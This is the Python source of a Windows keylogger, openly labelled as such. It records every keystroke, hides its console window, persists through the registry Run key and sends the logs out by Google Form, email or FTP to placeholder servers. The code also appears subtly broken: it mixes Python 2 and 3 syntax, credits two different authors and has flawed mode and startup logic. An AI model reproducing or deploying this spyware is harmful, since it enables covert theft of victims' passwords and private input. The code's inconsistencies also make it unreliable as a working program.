# Xenotix Python Keylogger for Windows
# ====================================
# Coded By: Geoffrey Geek(geofrykeli@gmail.com)
# This script captures keystrokes and stores them in a local file, sends them to Google Forms, emails them, or uploads them to FTP.
# It runs as a background process and can optionally add itself to startup.

# Import necessary modules for keylogging, system interaction, threading, and networking
try:
    import pythoncom, pyHook  # Required for capturing keyboard events
except ImportError:
    print("Please install pythoncom and pyHook modules.")
    exit(0)

import os
import sys
import threading  # For sending logs in intervals (email/FTP)
import urllib
import urllib2  # For sending logs via Google Forms
import smtplib  # For sending logs via email
import ftplib  # For FTP upload
import datetime
import time
import win32event, win32api, winerror  # For handling multiple instance prevention
from _winreg import *  # For adding to Windows startup

# Prevent multiple instances of the keylogger
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("Multiple instances not allowed.")
    exit(0)

# Global variables for logging
x = ''  # Mode selector (local, remote, email, FTP)
data = ''  # To store captured keystrokes
count = 0  # Log file count for FTP uploads

# Function to hide the console window
def hide():
    import win32console, win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)  # 0 hides the window
    return True

# Display usage information for the keylogger
def msg():
    print("""
    Xenotix Python Keylogger for Windows
    Coder: Ajin Abraham <ajin25@gmail.com>
    OPENSECURITY.IN
    Usage: xenotix_python_logger.py mode [optional:startup]
    mode:
        local: store the logs in a file [keylogs.txt]
        remote: send the logs to a Google Form. Specify the Form URL and Field Name in the script.
        email: send the logs to an email. Specify (SERVER, PORT, USERNAME, PASSWORD, TO).
        ftp: upload logs file to an FTP account. Specify (SERVER, USERNAME, PASSWORD, SSL OPTION, OUTPUT DIRECTORY).
    [optional] startup: This will add the keylogger to Windows startup.
    """)
    return True

# Function to add the keylogger to Windows startup
def addStartup():
    # Get the full path of the script
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp + "\\" + file_name

    # Open the Windows registry and add the keylogger path to startup entries
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, "Xenotix Keylogger", 0, REG_SZ, new_file_path)

# Local keylogger: stores keystrokes in a text file
def local():
    global data
    if len(data) > 100:  # Save logs after every 100 characters
        with open("keylogs.txt", "a") as fp:
            fp.write(data)
        data = ''  # Clear data after saving
    return True

# Remote keylogger: sends logs to Google Forms
def remote():
    global data
    if len(data) > 100:
        url = "https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Specify Google Form URL here
        klog = {'entry.xxxxxxxxxxx': data}  # Specify the Field Name here
        try:
            dataenc = urllib.urlencode(klog)  # Encode the data to send in a POST request
            req = urllib2.Request(url, dataenc)
            response = urllib2.urlopen(req)
            data = ''  # Clear data after sending
        except Exception as e:
            print(e)
    return True

# Class for sending logs via email at intervals
class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()

    def run(self):
        while not self.event.is_set():
            global data
            if len(data) > 100:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com"  # Specify email server
                PORT = 587  # Specify port (usually 587 for Gmail)
                USER = "your_email@gmail.com"  # Specify your email address
                PASS = "password_here"  # Specify your email password
                FROM = USER  # From address is the same as username
                TO = ["to_address@gmail.com"]  # Specify recipient's email. Use commas for multiple recipients.
                SUBJECT = "Keylogger data: " + str(ts)
                MESSAGE = data
                message = f"From: {FROM}\nTo: {', '.join(TO)}\nSubject: {SUBJECT}\n\n{MESSAGE}"
                try:
                    server = smtplib.SMTP(SERVER, PORT)
                    server.starttls()  # Start TLS for security
                    server.login(USER, PASS)
                    server.sendmail(FROM, TO, message)
                    data = ''  # Clear data after sending
                    server.quit()
                except Exception as e:
                    print(e)
            self.event.wait(120)  # Send logs every 2 minutes

# Function to upload logs to FTP
def ftp():
    global data, count
    if len(data) > 100:
        count += 1
        FILENAME = f"logs-{count}.txt"
        with open(FILENAME, "a") as fp:
            fp.write(data)
        data = ''  # Clear data after saving

        try:
            SERVER = "ftp.xxxxxx.com"  # Specify FTP server address
            USERNAME = "ftp_username"  # Specify FTP username
            PASSWORD = "ftp_password"  # Specify FTP password
            SSL = 0  # Set to 1 for SSL connection, 0 for normal FTP
            OUTPUT_DIR = "/"  # Specify output directory on FTP server

            # Connect to FTP server
            if SSL == 0:
                ft = ftplib.FTP(SERVER, USERNAME, PASSWORD)
            elif SSL == 1:
                ft = ftplib.FTP_TLS(SERVER, USERNAME, PASSWORD)

            ft.cwd(OUTPUT_DIR)  # Change to the specified directory
            with open(FILENAME, 'rb') as fp:
                ft.storbinary(f'STOR {FILENAME}', fp)  # Upload the file
            ft.quit()
            os.remove(FILENAME)  # Remove file after uploading
        except Exception as e:
            print(e)
    return True

# Main function to handle different keylogger modes
def main():
    global x
    if len(sys.argv) == 1:
        msg()
        exit(0)
    else:
        if len(sys.argv) > 2 and sys.argv[2] == "startup":
            addStartup()  # Add keylogger to startup if specified
        else:
            msg()
            exit(0)

        # Set the mode (local, remote, email, FTP) based on command-line argument
        if sys.argv[1] == "local":
            x = 1
            hide()
        elif sys.argv[1] == "remote":
            x = 2
            hide()
        elif sys.argv[1] == "email":
            hide()
            email = TimerClass()
            email.start()
        elif sys.argv[1] == "ftp":
            x = 4
            hide()
        else:
            msg()
            exit(0)
    return True

if __name__ == '__main__':
    main()

# Function to capture keystrokes and store/send them based on the mode
def keypressed(event):
    global x, data
    if event.Ascii == 13:
        keys = '<ENTER>'
    elif event.Ascii == 8:
        keys = '<BACK SPACE>'
    elif event.Ascii == 9:
        keys = '<TAB>'
    else:
        keys = chr(event.Ascii)

    data = data + keys  # Add captured keystroke to data

    # Call the appropriate function based on mode
    if x == 1:
        local()  # Store locally
    elif x == 2:
        remote()  # Send to Google Form
    elif x == 4:
        ftp()  # Upload to FTP

# Hook the keyboard events using pyHook
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()  # Start listening for keyboard events
